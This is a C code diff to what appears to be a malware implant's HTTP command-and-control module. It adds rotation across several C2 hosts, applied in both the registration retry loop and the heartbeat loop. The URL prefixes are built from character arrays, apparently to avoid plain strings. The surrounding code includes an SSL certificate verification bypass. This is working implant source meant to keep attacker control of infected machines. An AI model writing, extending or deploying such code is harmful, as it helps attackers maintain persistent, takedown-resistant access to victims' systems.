@@ -27,6 +27,31 @@ FUNC BYTE NaxRotateIdx( PNAX_INSTANCE Nax, BYTE idx, BYTE count ) {
     return ( idx + 1 ) % count;
 }
 
+/* ========= [ host rotation URL builder ] ========= */
+
+FUNC static VOID NaxBuildHostUrl( PNAX_INSTANCE Nax, PCHAR host, PWCHAR out, UINT32 cap ) {
+    UINT32 wi = 0;
+    BOOL is_https = ( Nax->Config.C2Url[0] == 'h' && Nax->Config.C2Url[4] == 's' );
+    if ( is_https ) {
+        CHAR s[] = {'h','t','t','p','s',':','/','/'}; for ( UINT32 c = 0; c < 8 && wi < cap - 1; c++ ) out[wi++] = (WCHAR)s[c];
+    } else {
+        CHAR s[] = {'h','t','t','p',':','/','/'}; for ( UINT32 c = 0; c < 7 && wi < cap - 1; c++ ) out[wi++] = (WCHAR)s[c];
+    }
+    for ( UINT32 c = 0; host[c] && wi < cap - 1; c++ ) out[wi++] = (WCHAR)(BYTE)host[c];
+    out[wi] = L'\0';
+}
+
+FUNC static VOID NaxRotateHost( PNAX_INSTANCE Nax, PWCHAR c2_url_w, UINT32 cap ) {
+    if ( Nax->Config.HostCount == 0 ) return;
+    BYTE hidx = Nax->Config.HostIdx;
+    NaxBuildHostUrl( Nax, Nax->Config.Hosts[hidx], c2_url_w, cap );
+    Nax->Config.HostIdx = NaxRotateIdx( Nax, hidx, Nax->Config.HostCount );
+    if ( Nax->Config.HostCount > 1 && Nax->hConnect ) {
+        Nax->Winhttp.WinHttpCloseHandle( Nax->hConnect );
+        Nax->hConnect = NULL;
+    }
+}
+
 /* ========= [ SSL certificate bypass ] ========= */
 
 FUNC static VOID NaxHttpDisableSslVerify( PNAX_INSTANCE Nax, HINTERNET hRequest ) {
@@ -519,6 +544,7 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
 
     /* ---- REGISTER retry loop ---- */
     for ( ;; ) {
+        NaxRotateHost( Nax, c2_url_w, 128 );
         frame_len = FRAME_CAP; env_len = FRAME_CAP; resp_len = IO_CAP;
 
         BYTE   reg_body[NAX_REG_BODY_BUF]; UINT32 reg_body_len = NAX_REG_BODY_BUF;
@@ -600,6 +626,7 @@ FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
 
     /* ---- heartbeat loop ---- */
     for ( ;; ) {
+        NaxRotateHost( Nax, c2_url_w, 128 );
         frame_len = FRAME_CAP;
         if ( NaxBuildHeartbeat( frame_h, &frame_len ) != NAX_OK ) continue;
 
